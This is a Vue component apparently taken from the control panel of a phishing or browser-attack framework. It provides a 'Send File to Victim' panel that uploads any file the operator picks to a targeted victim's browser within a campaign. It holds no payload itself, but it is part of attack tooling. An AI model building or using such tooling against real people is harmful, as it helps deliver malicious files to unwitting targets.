<script setup>
import { ref } from 'vue'
import { backendService } from '@/services/backend'
import FileUpload from 'primevue/fileupload'
import { useToast } from 'primevue/usetoast'

const props = defineProps({
    victim: Object,
    campaign: Object
})

const toast = useToast()
const fileUploader = ref(null)

const onAdvancedUpload = async () => {
    const file = fileUploader.value?.files[0]
    const filename = file?.name

    if (!file) {
        toast.add({
            severity: 'error',
            summary: 'Error',
            detail: 'No file selected',
            life: 3000
        })
        return
    }

    if (!props.victim || !props.campaign) {
        toast.add({
            severity: 'error',
            summary: 'Error',
            detail: 'Victim or campaign not available',
            life: 3000
        })
        return
    }

    try {
        // Send file directly using FormData
        await backendService.sendFileToVictim(
            props.campaign.id,
            props.victim.id,
            file
        )

        toast.add({
            severity: 'success',
            summary: 'Success',
            detail: `File ${filename} sent to victim`,
            life: 3000
        })

        // Clear uploader
        if (fileUploader.value) {
            fileUploader.value.clear()
        }
    } catch (error) {
        console.error('Failed to send file:', error)
        toast.add({
            severity: 'error',
            summary: 'Error',
            detail: 'Failed to send file: ' + (error?.message || error),
            life: 3000
        })
    }
}

function onFileSelect(event) {
    if (fileUploader.value) {
        const selectedFile = event.files.at(-1)
        fileUploader.value.clear()
        if (selectedFile) {
            fileUploader.value.files.push(selectedFile)
        }
    }
}



</script>
<template>
    <div class="send-file-panel">
        <div class="panel-header">
            <h4>Send File to Victim</h4>
            <p class="panel-description">Upload and send a file directly to the victim's browser</p>
        </div>

        <div class="upload-area">
            <FileUpload
                ref="fileUploader"
                name="file-upload"
                :customUpload="true"
                @uploader="onAdvancedUpload"
                @select="onFileSelect"
                accept=""
                :multiple="false"
                uploadLabel="Send to Victim"
                chooseLabel="Choose File"
            />
        </div>
    </div>
</template>

<style scoped>
.send-file-panel {
    display: flex;
    flex-direction: column;
    gap: 1.5rem;
}

.panel-header h4 {
    margin: 0;
    color: var(--color-heading);
    font-size: 1.125rem;
}

.panel-description {
    margin: 0.5rem 0 0 0;
    color: var(--color-text-mute);
    font-size: 0.875rem;
}

.upload-area {
    padding: 1rem;
    background: var(--color-background);
    border-radius: 8px;
    border: 1px solid var(--color-border);
}

.send-file-panel :deep(.p-fileupload-file-thumbnail) {
    display: none;
}
</style>